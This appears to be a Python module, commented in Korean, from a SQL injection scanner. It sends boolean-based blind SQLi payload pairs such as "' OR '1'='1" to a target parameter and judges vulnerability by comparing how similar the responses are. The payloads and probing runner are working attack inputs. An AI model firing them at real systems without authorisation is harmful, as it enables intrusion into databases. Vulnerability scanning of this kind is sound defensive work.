"""부울 기반 블라인드 SQLi 실행기 (참/거짓 응답 차이로 판정)"""
import difflib

from utils.attacks._common import inject, summarize

# (참 조건, 거짓 조건) 쌍 - 취약 시 참은 정상과 유사, 거짓은 상이
PAIRS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ('1 AND 1=1', '1 AND 1=2'),
    ('1" AND "1"="1', '1" AND "1"="2'),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1' AND 1=1--", "1' AND 1=2--"),
]
DIFF_THRESHOLD = 0.3  # 참/거짓 유사도 차이가 이 이상이면 취약 정황


def _sim(a, b):
    """두 응답 본문의 유사도 (0~1)"""
    return difflib.SequenceMatcher(None, a, b).ratio()


def judge_boolean(baseline, r_true, r_false):
    """참/거짓 응답을 비교해 판정 -> (verdict, evidence, confidence)"""
    if not (baseline['ok'] and r_true['ok'] and r_false['ok']):
        return 'INCONCLUSIVE', '요청 실패', '낮음'
    st = _sim(baseline['body'], r_true['body'])
    sf = _sim(baseline['body'], r_false['body'])
    ev = f'참 유사도 {st:.2f} / 거짓 유사도 {sf:.2f}'
    if st - sf >= DIFF_THRESHOLD:
        return 'VULNERABLE', f'참/거짓 응답 상이 ({ev})', '중간'
    # baseline·참·거짓이 서로 거의 동일하면 조건에 따른 분기가 없다는 뜻 -> SAFE
    tf = _sim(r_true['body'], r_false['body'])
    if st >= 0.98 and sf >= 0.98 and tf >= 0.98:
        return 'SAFE', f'참/거짓/기준선 응답 모두 동등 ({ev})', '중간'
    return 'INCONCLUSIVE', f'응답 차이 미미 ({ev})', '낮음'


def run_boolean(target, param='q', path='/', method='GET', timeout=10, scheme='http', verify=True):
    """정상 요청 후 참/거짓 쌍을 전송해 판정. (baseline, results) 반환"""
    baseline = inject(target, param, 'test', path, method, timeout, scheme, verify)

    results = []
    for t, f in PAIRS:
        r_true = inject(target, param, t, path, method, timeout, scheme, verify)
        r_false = inject(target, param, f, path, method, timeout, scheme, verify)
        v, ev, conf = judge_boolean(baseline, r_true, r_false)
        results.append({'pair': (t, f), 'verdict': v, 'evidence': ev, 'confidence': conf})
    return baseline, results


def format_results(baseline, results):
    """부울 블라인드 결과를 요약 텍스트로 변환"""
    base = f'기준선: HTTP {baseline["status"]}' if baseline['ok'] \
        else f'기준선 실패: {baseline["error"]}'
    lines = [base]

    for r in results:
        t, f = r['pair']
        lines.append(f'[{r["verdict"]}/{r["confidence"]}] 참[{t}] 거짓[{f}]  ({r["evidence"]})')

    overall, c = summarize(results)
    lines.append(f'== 종합: {overall} '
                 f'(취약 {c["VULNERABLE"]} / 안전 {c["SAFE"]} / '
                 f'판단불가 {c["INCONCLUSIVE"]}, 총 {len(results)}) ==')
    return '\n'.join(lines)
